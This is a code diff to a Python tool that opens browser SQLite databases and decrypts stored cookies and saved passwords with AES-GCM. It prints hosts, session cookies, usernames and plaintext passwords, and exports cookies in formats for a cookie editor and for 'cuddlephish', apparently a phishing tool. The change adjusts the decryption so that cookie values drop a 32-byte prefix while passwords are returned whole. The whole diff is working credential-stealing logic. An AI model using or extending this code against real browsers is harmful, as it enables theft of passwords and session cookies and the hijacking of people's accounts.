@@ -22,7 +22,7 @@ def cookies(key, file_location):
             print("Host: " + host_key)
             print("Path: " + path)
             print("Name: " + name)
-            print("Cookie: " + decrypt_data(encrypted_value,key) + ";")
+            print("Cookie: " + decrypt_data(encrypted_value,key, False) + ";")
             print("Expires: " + (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S'))
             print("")
     except sqlite3.Error as e:
@@ -41,7 +41,7 @@ def cookies_for_editor(key, file_location):
         cursor.execute('select host_key, "TRUE", path, "FALSE", expires_utc, name, CAST(encrypted_value AS BLOB) from cookies')
         values = cursor.fetchall()
         for host_key, _, path, _, expires_utc, name, encrypted_value in values:
-            decrypted_value = decrypt_data(encrypted_value, key)
+            decrypted_value = decrypt_data(encrypted_value, key, False)
             expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp()
             cookie = {
                 "domain": host_key,
@@ -78,7 +78,7 @@ def login_data(key, file_location):
         for origin_url, username_value, password_value in values:
             print("URL: " + origin_url)
             print("Username: " + username_value)
-            print("Password: " + decrypt_data(password_value, key))
+            print("Password: " + decrypt_data(password_value, key, True))
             print("")
     except sqlite3.Error as e:
         print("Error: Could not connect to database")
@@ -136,7 +136,7 @@ def cookies_for_cuddlephish(key, file_location):
         print(e)
         sys.exit(1)
 
-def decrypt_data(encrypted_junk, key):
+def decrypt_data(encrypted_junk, key, password=False):
     #key = binascii.unhexlify(key)
     version = encrypted_junk[:3]
     if version in (b'v10', b'v11'):
@@ -164,8 +164,10 @@ def decrypt_data(encrypted_junk, key):
             tag = encrypted_junk[-16:]
             plain_text = AES.new(key, AES.MODE_GCM, nonce)
             text = plain_text.decrypt(cipher_text)
-            return text.decode('utf-8')
-            # return text[32:].decode('utf-8')
+            if password:
+                return text.decode('utf-8')
+            else:
+                return text[32:].decode('utf-8')
         except Exception as e:
             print("Error: Could not decrypt password")
             print(e)
